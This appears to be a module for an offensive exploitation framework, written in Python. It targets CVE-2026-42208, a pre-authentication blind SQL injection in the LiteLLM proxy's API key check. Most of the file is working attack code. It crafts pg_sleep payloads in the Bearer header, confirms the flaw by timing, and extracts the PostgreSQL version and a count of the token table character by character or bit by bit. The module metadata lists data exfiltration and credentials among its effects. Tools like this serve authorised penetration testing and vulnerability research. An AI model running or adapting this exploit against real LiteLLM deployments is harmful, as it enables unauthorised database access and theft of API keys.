#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-42208 — LiteLLM pre-auth time-based blind SQLi (Authorization Bearer)."""

import json
import time
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "LiteLLM CVE-2026-42208 pre-auth SQLi",
        "description": (
            "Confirms/exploits CVE-2026-42208: pre-authentication SQL injection in "
            "BerriAI LiteLLM proxy API key verification (1.81.16–1.83.6, fixed 1.83.7). "
            "Injects via Authorization: Bearer (must NOT start with sk-) on LLM routes "
            "such as POST /v1/chat/completions. Response body is always auth_error 401; "
            "only PostgreSQL pg_sleep timing leaks data. Supports test confirmation, "
            "custom boolean conditions, and light metadata extraction."
        ),
        "author": ["Tencent YunDing Security Lab", "Bishop Fox", "KittySploit Team"],
        "cve": ["CVE-2026-42208"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42208",
            "https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc",
            "https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy",
        ],
        "tags": [
            "litellm",
            "llm",
            "sqli",
            "blind",
            "time-based",
            "pre-auth",
            "postgresql",
            "cve-2026-42208",
            "kev",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.45,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["litellm", "openai"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/v1/chat/completions"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy HTTP port (default 4000)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "LiteLLM base path prefix", required=False)
    action = OptString(
        "test",
        "Action: test | condition | pg_version | token_count",
        required=False,
    )
    sleep_seconds = OptInteger(
        4,
        "pg_sleep() seconds for true branch",
        required=False,
        advanced=True,
    )
    repeats = OptInteger(
        2,
        "Confirmation repeats for action=test (jitter filter)",
        required=False,
        advanced=True,
    )
    probe_path = OptString(
        "/v1/chat/completions",
        "LLM API route for the Bearer injection",
        required=False,
        advanced=True,
    )
    condition = OptString(
        "1=1",
        "Boolean SQL condition for action=condition (true → sleep)",
        required=False,
    )
    max_length = OptInteger(
        40,
        "Max chars for time-based string extraction",
        required=False,
        advanced=True,
    )

    def _timeout(self) -> int:
        sleep_s = max(int(self.sleep_seconds or 4), 1)
        return max(int(self.timeout or 20), sleep_s * 3 + 15)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/") or ""

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    def _bearer_payload(self, condition: str) -> str:
        sleep_s = max(int(self.sleep_seconds or 4), 1)
        # Do NOT prefix with sk- — hashing would neutralize the injection.
        return (
            f"' OR (SELECT CASE WHEN ({condition}) "
            f"THEN pg_sleep({sleep_s}) ELSE pg_sleep(0) END) IS NULL --"
        )

    def _request(self, bearer: str) -> Tuple[Optional[object], float]:
        body = json.dumps(
            {
                "model": "x",
                "messages": [{"role": "user", "content": "x"}],
            }
        )
        start = time.perf_counter()
        response = self.http_request(
            method="POST",
            path=self._path(str(self.probe_path or "/v1/chat/completions")),
            headers={
                "Authorization": f"Bearer {bearer}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            data=body,
            timeout=self._timeout(),
            allow_redirects=False,
        )
        return response, time.perf_counter() - start

    def _oracle(self, condition: str) -> bool:
        sleep_s = max(int(self.sleep_seconds or 4), 1)
        _, elapsed = self._request(self._bearer_payload(condition))
        return elapsed >= (sleep_s * 0.75)

    def _baseline_elapsed(self) -> float:
        _, elapsed = self._request("ks-baseline-not-a-key")
        return elapsed

    def _confirm(self) -> Tuple[bool, str]:
        sleep_s = max(int(self.sleep_seconds or 4), 1)
        rounds = max(int(self.repeats or 2), 1)
        base = self._baseline_elapsed()
        delays = []
        for _ in range(rounds):
            resp, elapsed = self._request(
                f"' OR (SELECT pg_sleep({sleep_s})) IS NULL --"
            )
            delays.append(elapsed)
            status = getattr(resp, "status_code", None)
            if status not in (None, 401, 403, 400, 422):
                print_info(f"Unexpected HTTP {status} during probe")

        avg = sum(delays) / len(delays)
        threshold = max(sleep_s * 0.8, base + sleep_s * 0.65)
        detail = (
            f"baseline={base:.2f}s, sleeps={[round(d, 2) for d in delays]}, "
            f"avg={avg:.2f}s, threshold={threshold:.2f}s"
        )
        if avg >= threshold and all(d >= threshold * 0.85 for d in delays):
            return True, f"Time-based SQLi confirmed ({detail})"
        if avg >= threshold:
            return True, f"Time-based SQLi likely ({detail})"
        return False, f"No consistent delay ({detail})"

    def _extract_string(self, sql_expr: str, max_len: int) -> str:
        """Blind extract ascii chars of (sql_expr)::text via binary search."""
        charset_hi = 126
        out = []
        length = 0
        for n in range(0, max_len + 1):
            if self._oracle(f"length(({sql_expr})::text)>{n}"):
                length = n + 1
            else:
                break
        if length == 0:
            return ""

        print_status(f"Extracting {length} chars…")
        for pos in range(1, length + 1):
            lo, hi = 32, charset_hi
            while lo < hi:
                mid = (lo + hi) // 2
                if self._oracle(
                    f"ascii(substr(({sql_expr})::text,{pos},1))>{mid}"
                ):
                    lo = mid + 1
                else:
                    hi = mid
            out.append(chr(lo) if 32 <= lo <= 126 else "?")
            print_info(f"  [{pos}/{length}] {''.join(out)}")
        return "".join(out)

    def _extract_int(self, sql_expr: str, max_bits: int = 20) -> Optional[int]:
        if not self._oracle(f"({sql_expr}) IS NOT NULL"):
            return None
        value = 0
        for bit in range(max_bits):
            if self._oracle(f"(({sql_expr})::bigint & {1 << bit})<>0"):
                value |= 1 << bit
        return value

    def run(self):
        action = str(self.action or "test").strip().lower()
        print_status(
            f"CVE-2026-42208 LiteLLM Bearer SQLi — action={action}, "
            f"path={self.probe_path}"
        )

        if action == "test":
            ok, reason = self._confirm()
            if ok:
                print_warning(reason)
                print_info(
                    "Note: empty LiteLLM_VerificationToken skips WHERE evaluation; "
                    "production proxies with keys are the intended target."
                )
                return True
            print_error(reason)
            print_info(
                "If version is vulnerable but timing fails: disable_error_logs=true, "
                "no Postgres, or empty verification-token table."
            )
            return False

        if action == "condition":
            cond = str(self.condition or "1=1").strip()
            print_status(f"Oracle condition: {cond}")
            true_hit = self._oracle(cond)
            false_hit = self._oracle("1=0")
            print_info(f"condition true-branch delay: {true_hit}")
            print_info(f"control 1=0 delay: {false_hit}")
            if true_hit and not false_hit:
                print_warning("Boolean timing oracle works")
                return True
            print_error("Oracle inconclusive")
            return False

        if action == "pg_version":
            ok, reason = self._confirm()
            if not ok:
                print_error(reason)
                return False
            print_warning(reason)
            ver = self._extract_string("version()", int(self.max_length or 40))
            if ver:
                print_success(f"PostgreSQL version: {ver}")
                return True
            print_error("Failed to extract version()")
            return False

        if action == "token_count":
            ok, reason = self._confirm()
            if not ok:
                print_error(reason)
                return False
            print_warning(reason)
            count = self._extract_int(
                '(SELECT COUNT(*) FROM "LiteLLM_VerificationToken")'
            )
            if count is None:
                print_error("Could not read LiteLLM_VerificationToken count")
                return False
            print_success(f'LiteLLM_VerificationToken rows: {count}')
            return True

        print_error(f"Unknown action: {action}")
        print_info("Valid: test | condition | pg_version | token_count")
        return False
